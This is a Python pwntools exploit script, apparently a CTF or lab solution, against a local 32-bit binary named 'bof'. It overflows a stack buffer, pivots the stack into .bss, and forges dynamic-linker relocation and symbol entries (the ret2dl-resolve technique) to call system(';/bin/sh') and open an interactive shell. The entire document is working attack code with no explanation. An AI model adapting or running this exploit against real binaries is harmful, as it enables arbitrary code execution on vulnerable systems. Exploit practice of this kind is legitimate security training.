#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.arch = "i386"

io = process("./bof")
elf = ELF("./bof")
rop = ROP("./bof")

offset = 112
base = elf.bss() + 0x800

rop.raw('a' * offset)
rop.read(0, base, 0x100)
rop.migrate(base)

io.sendlineafter("!\n", rop.chain())


cmd = ";/bin/sh\0"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
relplt = elf.get_section_by_name(".rel.plt").header.sh_addr
dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
dynstr = elf.get_section_by_name(".dynstr").header.sh_addr
elf_sym_addr = base + 32
align = 0x10 - ((elf_sym_addr - dynsym) & 0xf)
elf_sym_addr = elf_sym_addr + align
idx_dynsym = (elf_sym_addr - dynsym) / 0x10
st_name = elf_sym_addr + 0x10 - dynstr
elf_sym = flat([st_name, 0, 0, 0x12])
reloc_index = base + 24 - relplt
r_offset = elf.got['write']
r_info = (idx_dynsym << 8) | 0x7
elf_rel = flat([r_offset, r_info])

rop = ROP("./bof")
rop.raw(plt0)
rop.raw(reloc_index)
rop.raw('aaaa')
rop.raw(base + 82)
rop.raw('aaaa')
rop.raw('aaaa')
rop.raw(elf_rel)
rop.raw('a' * align)
rop.raw(elf_sym)
rop.raw("system\0")
rop.raw('a' * (0x80 - len(rop.chain())))
rop.raw(cmd)
rop.raw('a' * (0x100 - len(rop.chain())))

print rop.dump()
io.sendline(rop.chain())

io.interactive()
io.close()
